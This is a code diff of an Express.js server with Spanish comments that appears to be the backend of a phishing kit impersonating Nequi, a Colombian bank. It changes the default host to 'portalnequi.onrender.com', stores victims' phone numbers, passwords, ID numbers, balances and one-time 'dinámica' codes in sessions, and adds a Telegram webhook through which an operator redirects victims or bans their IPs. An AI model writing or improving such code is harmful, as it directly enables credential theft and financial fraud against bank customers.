@@ -23,7 +23,7 @@ app.use(express.static('public')); // Servir archivos estáticos
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RENDER_URL = process.env.RENDER_URL || 'https://propulsorneq.onrender.com';
+const RENDER_URL = process.env.RENDER_URL || 'https://portalnequi.onrender.com';
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
@@ -133,14 +133,7 @@ app.post('/step1-credentials', async (req, res) => {
     }
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	   return res.status(400).json({
-	   ok: false,
-	   error: "Session no existe o se perdió"
-		  });
-		}
-
+    const session = sessionData.get(sessionId) || {};
     session.phoneNumber = phoneNumber;
     session.password = password;
     session.ip = ip;
@@ -182,14 +175,7 @@ app.post('/step2-loan-first', async (req, res) => {
     } = req.body;
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	    return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-		  });
-		}
-
+    const session = sessionData.get(sessionId) || {};
     session.cedula = cedula;
     session.nombreCompleto = nombreCompleto;
     session.ocupacion = ocupacion;
@@ -217,14 +203,7 @@ app.post('/step2-loan-second', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	  return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-	  });
-}
-
+    const session = sessionData.get(sessionId) || {};
     session.saldoActual2 = saldoActual; // Segundo saldo
     sessionData.set(sessionId, session);
 
@@ -272,14 +251,7 @@ app.post('/step3-dynamic', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId);
-	if (!session) {
-	  return res.status(400).json({
-		ok: false,
-		error: "Session no existe o se perdió"
-	  });
-	}
-
+    const session = sessionData.get(sessionId) || {};
     
     // Guardar la dinámica
     if (!session.dynamics) {
@@ -355,57 +327,27 @@ app.post('/consignar', async (req, res) => {
 
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
-  res.sendStatus(200);
+  try {
+    const update = req.body;
+    const { callback_query } = update;
+    
+    if (callback_query) {
+      const [action, sessionId] = (callback_query.data || '').split('|');
+      
+      console.log(`📞 Callback recibido - Acción: ${action} - Session: ${sessionId}`);
+      
+      // Eliminar menú de botones
+      try {
+        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
+          chat_id: callback_query.message.chat.id,
+          message_id: callback_query.message.message_id,
+          reply_markup: { inline_keyboard: [] }
+        });
+      } catch (editError) {
+        console.log('⚠️ No se pudo eliminar el menú');
+      }
 
-  const update = req.body;
-  if (!update.callback_query) return;
-
-  const callback = update.callback_query;
-  const [action, sessionId] = (callback.data || '').split('|');
-
-  console.log("📞 Acción:", action, "Session:", sessionId);
-
-  // RESPONDER AL BOTÓN (OBLIGATORIO)
-  await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
-    callback_query_id: callback.id,
-    text: '✅ Acción recibida',
-    show_alert: false
-  });
-
-  // ===== MANEJO DE ACCIONES =====
-
-  if (action === 'ban') {
-    const session = sessionData.get(sessionId);
-    if (session?.ip) {
-      bannedIPs.add(session.ip);
-      redirections.set(sessionId, 'banned');
-    }
-    return;
-  }
-
-  if (action === 'error-dynamic') {
-    redirections.set(sessionId, 'error-dynamic');
-    return;
-  }
-
-  if (action === 'go:loan-simulator-error') {
-    redirections.set(sessionId, 'loan-simulator-error');
-    return;
-  }
-
-  if (action.startsWith('go:')) {
-    const route = action.replace('go:', '');
-    redirections.set(sessionId, route);
-  }
-});
-
-
-
-
-
-
-
-	// ==================== MANEJO DE ACCIONES ====================
+      // ==================== MANEJO DE ACCIONES ====================
       
       // BANEAR IP
       if (action === 'ban') {
